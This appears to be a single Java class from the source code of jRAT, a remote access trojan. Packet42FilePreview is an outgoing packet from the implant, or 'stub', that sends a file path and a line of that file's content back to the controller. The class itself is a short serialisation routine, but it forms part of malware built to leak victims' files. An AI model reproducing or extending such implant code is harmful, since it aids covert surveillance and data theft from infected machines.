package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet42FilePreview extends AbstractOutgoingPacket {

	private String file;
	private String line;

	public Packet42FilePreview(String file, String line) {
		this.file = file;
		this.line = line;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(file);
		sw.writeLine(line);
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
